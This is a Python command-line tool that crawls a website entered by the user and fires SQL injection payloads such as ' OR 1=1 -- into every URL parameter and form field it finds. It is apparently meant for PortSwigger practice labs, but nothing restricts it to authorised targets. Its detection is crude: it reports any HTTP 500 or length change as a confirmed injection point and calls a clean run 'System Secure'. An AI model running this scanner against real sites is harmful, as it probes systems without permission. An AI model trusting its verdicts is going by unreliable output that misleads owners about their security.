#!/usr/bin/env python3
"""
Project Name: Advanced Web Crawler & SQL Injection Radar
Author: Sithum
Description: A professional multi-vector vulnerability scanner that implements
             web crawling, error signature analysis, and boolean-based 
             content length anomaly detection to uncover SQLi endpoints.
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# ANSI Terminal Color Escape Codes
CLR_RESET  = "\033[0m"
CLR_RED    = "\033[91m"
CLR_GREEN  = "\033[92m"
CLR_YELLOW = "\033[93m"
CLR_BLUE   = "\033[94m"
CLR_CYAN   = "\033[96m"
CLR_BOLD   = "\033[1m"

# Standard HTTP headers to handle basic user-agent filters smoothly
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

# Optional session cookies mapping dictionary (Crucial for PortSwigger Labs)
COOKIES = {}

# Known database dynamic syntax error strings
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql_fetch_array()",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "oracle error",
    "postgreSQL query failed",
    "driver][odbc sql server driver]",
    "dynamic sql error",
    "internal server error"
]

# Thread-safe global set tracking identified app paths to eliminate loop execution
discovered_urls = set()

def show_banner():
    """ Displays a clean, vibrant stylized terminal banner asset """
    print(f"{CLR_CYAN}{CLR_BOLD}==================================================")
    print("      ADVANCED WEB RADAR: CRAWLER & SQLi          ")
    print(f"      Engineered by: {CLR_YELLOW}Sithum{CLR_CYAN}                       ")
    print(f"=================================================={CLR_RESET}")

def is_internal_link(base_url, link_url):
    """ Validates domain structures to safely quarantine crawling to the target scope """
    base_domain = urlparse(base_url).netloc
    link_domain = urlparse(link_url).netloc
    return base_domain == link_domain or link_domain == ''

def crawl_website(target_url, current_url, max_depth=3):
    """ Maps logical directory trees across application endpoints recursively """
    if max_depth == 0 or current_url in discovered_urls:
        return

    # Skip general static binary assets and stylesheets
    if any(ext in current_url.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.css', '.pdf', '.woff', '.ico']):
        return
        
    # Explicitly catch static script files without blocking active server extensions like .jsp
    if current_url.lower().split('?')[0].endswith('.js'):
        return

    try:
        print(f"{CLR_BLUE}[#]{CLR_RESET} Crawling endpoint: {current_url}")
        discovered_urls.add(current_url)
        
        res = requests.get(current_url, headers=HEADERS, cookies=COOKIES, timeout=5)
        soup = BeautifulSoup(res.content, "html.parser")
        
        for a_tag in soup.find_all("a", href=True):
            href = a_tag.get("href")
            full_url = urljoin(target_url, href)
            clean_url = full_url.split('#')[0]
            
            if is_internal_link(target_url, clean_url) and clean_url not in discovered_urls:
                crawl_website(target_url, clean_url, max_depth - 1)
                
    except Exception:
        return

def audit_parameters(url):
    """
    Audits dynamic query strings using both known DB error signatures AND 
    Boolean-based content length variations.
    """
    if "?" not in url:
        return False
        
    print(f"  {CLR_YELLOW}[~]{CLR_RESET} Auditing URL Parameters on: {url}")
    payloads = ["'", "\"", "1' OR '1'='1", "' OR 1=1 --"]
    vulnerable = False
    
    # Establish a reliable baseline length configuration from the clean query
    try:
        baseline_res = requests.get(url, headers=HEADERS, cookies=COOKIES, timeout=5)
        baseline_len = len(baseline_res.text)
    except Exception:
        return False
        
    base_url, query_string = url.split("?", 1)
    pairs = query_string.split("&")
    
    for i, pair in enumerate(pairs):
        if "=" not in pair:
            continue
        key, val = pair.split("=", 1)
        
        for payload in payloads:
            new_pair = f"{key}={val}{payload}"
            new_pairs = pairs.copy()
            new_pairs[i] = new_pair
            new_query_string = "&".join(new_pairs)
            
            test_url = f"{base_url}?{new_query_string}"
            
            try:
                res = requests.get(test_url, headers=HEADERS, cookies=COOKIES, timeout=5)
                current_len = len(res.text)
                
                # Metric Variant 1: Verify Error Signature Matching
                error_detected = res.status_code == 500 or any(error in res.text.lower() for error in SQL_ERRORS)
                
                # Metric Variant 2: Content Length Drop Anomaly Check (e.g., Blind/Boolean drops)
                length_anomaly = abs(baseline_len - current_len) > 100 
                
                if error_detected or length_anomaly:
                    detection_type = "Error Signature" if error_detected else "Content Length Anomaly"
                    print(f"\n{CLR_RED}{CLR_BOLD}[!] 🚨 VULNERABILITY DETECTED IN URL PARAMETER! 🚨")
                    print(f"    -> Target Endpoint: {base_url}")
                    print(f"    -> Attack Vector URL: {test_url}")
                    print(f"    -> Vulnerable Key: {key}")
                    print(f"    -> Exploit Payload: {payload}")
                    print(f"    -> Detection Model: {detection_type}{CLR_RESET}\n")
                    vulnerable = True
                    return True  # Exit immediately once vulnerability status is verified
            except Exception:
                continue
                
    return vulnerable

def audit_forms(url):
    """ Extracts explicit web forms and submits input payloads across POST/GET scopes """
    try:
        res = requests.get(url, headers=HEADERS, cookies=COOKIES, timeout=5)
        soup = BeautifulSoup(res.content, "html.parser")
        forms = soup.find_all("form")
    except Exception:
        return False
        
    if not forms:
        return False
        
    print(f"  {CLR_YELLOW}[~]{CLR_RESET} Auditing {len(forms)} HTML Form(s) on: {url}")
    payloads = ["'", "\"", "1' OR '1'='1"]
    vulnerable = False
    
    for form in forms:
        action = form.attrs.get("action", "")
        method = form.attrs.get("method", "get").lower()
        form_url = urljoin(url, action)
        
        inputs = [inp.attrs.get("name") for inp in form.find_all("input") if inp.attrs.get("name")]
        
        for payload in payloads:
            data = {inp: payload for inp in inputs}
            try:
                if method == "post":
                    response = requests.post(form_url, data=data, headers=HEADERS, cookies=COOKIES, timeout=5)
                else:
                    response = requests.get(form_url, params=data, headers=HEADERS, cookies=COOKIES, timeout=5)
                    
                if response.status_code == 500 or any(error in response.text.lower() for error in SQL_ERRORS):
                    print(f"\n{CLR_RED}{CLR_BOLD}[!] 🚨 VULNERABILITY DETECTED IN HTML FORM! 🚨")
                    print(f"    -> Form Action Path: {form_url}")
                    print(f"    -> HTTP Protocol Method: {method.upper()}")
                    print(f"    -> Exploit Payload: {payload}{CLR_RESET}\n")
                    vulnerable = True
                    return True
            except Exception:
                continue
                
    return vulnerable

def main():
    show_banner()
    
    target = input(f"{CLR_BOLD}Enter website base URL (e.g., https://example.com): {CLR_RESET}").strip()
    if not target:
        print(f"{CLR_RED}[-] Input target null. Exiting execution.{CLR_RESET}")
        return
        
    if not target.startswith("http"):
        target = "http://" + target
        
    cookie_input = input(f"{CLR_BOLD}Enter Session Cookie value (Optional for Labs, press Enter to skip): {CLR_RESET}").strip()
    if cookie_input:
        COOKIES["session"] = cookie_input

    # Step 1: Web Crawling Stage
    print(f"\n{CLR_CYAN}[Step 1] Mapping target infrastructure and discovering application paths...{CLR_RESET}")
    crawl_website(target, target, max_depth=3)
    
    print(f"\n{CLR_GREEN}[+] Map build sequence finished. Registered {len(discovered_urls)} unique page paths:{CLR_RESET}")
    for mapped_url in discovered_urls:
        print(f"  {CLR_GREEN}->{CLR_RESET} {mapped_url}")
        
    # Step 2: Multi-Vector Scanning Stage
    print(f"\n{CLR_CYAN}[Step 2] Launching multi-vector target audits across crawled elements...{CLR_RESET}")
    vulnerabilities_counter = 0
    
    for scan_url in discovered_urls:
        if audit_parameters(scan_url):
            vulnerabilities_counter += 1
        if audit_forms(scan_url):
            vulnerabilities_counter += 1
            
    print(f"{CLR_CYAN}{CLR_BOLD}=================================================={CLR_RESET}")
    if vulnerabilities_counter > 0:
        print(f"{CLR_RED}{CLR_BOLD}[*] Scan cycle dead. Total confirmed SQLi points mapped: {vulnerabilities_counter}{CLR_RESET}")
    else:
        print(f"{CLR_GREEN}{CLR_BOLD}[*] Scan cycle dead. Total confirmed SQLi points mapped: 0 (System Secure){CLR_RESET}")
    print(f"{CLR_CYAN}{CLR_BOLD}=================================================={CLR_RESET}")

if __name__ == "__main__":
    main()
